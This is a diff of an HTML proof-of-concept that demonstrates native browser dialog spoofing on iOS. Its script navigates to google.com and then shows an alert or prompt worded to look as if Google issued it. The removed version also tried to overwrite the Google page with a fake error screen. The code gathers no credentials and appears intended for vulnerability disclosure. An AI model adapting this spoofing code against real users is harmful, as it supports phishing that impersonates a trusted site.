@@ -1,43 +1,55 @@
-<script>
-function runPoC() {
-  // Navigate to top-level context
-  const w = open("https://www.google.com", "_top");
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>News</title>
 
-  setTimeout(() => {
-    try {
-      w.document.body.innerHTML = `
-        <style>
-          body {
-            margin: 0;
-            font-family: system-ui, sans-serif;
-            background: #f2f2f2;
-            text-align: center;
-            padding-top: 22vh;
-          }
-        </style>
-
-        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" width="120">
-        <h2>An error has occurred</h2>
-        <p>Please wait while the page reloads.</p>
-      `;
-
-      // Native dialog – no input, no auth
-      setTimeout(() => {
-        alert(
-          "Google.com says:\n\nThis page needs to reload to continue."
-        );
-
-        // Redirect to legitimate page after dialog
-        location.href = "https://www.google.com";
-      }, 400);
-
-    } catch (e) {
-      console.log("Blocked by browser security model");
-    }
-  }, 300);
+<style>
+body {
+  font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+  margin: 0;
+  background: #f2f2f7;
 }
+#news {
+  max-width: 680px;
+  margin: 40px auto;
+  background: white;
+  padding: 24px;
+  border-radius: 12px;
+}
+</style>
+</head>
 
-// Trigger after delay
-setTimeout(runPoC, 3000);
+<body>
+
+<div id="news">
+  <h1>Security Notice</h1>
+  <p>
+    This page demonstrates how native browser dialogs on iOS
+    may appear ambiguous after navigation.
+  </p>
+</div>
+
+<script>
+setTimeout(() => {
+
+  // Navigate to trusted-looking context
+  location.href = "https://www.google.com";
+
+  // Native iOS prompt (NO credentials)
+  setTimeout(() => {
+    prompt(
+      "google.com says:\n\nThis page needs to reload to continue.",
+      "Tap OK to proceed"
+    );
+
+    // Return to legitimate page
+    location.href = "https://www.google.com";
+  }, 900);
+
+}, 3000);
 </script>
 
+</body>
+</html>
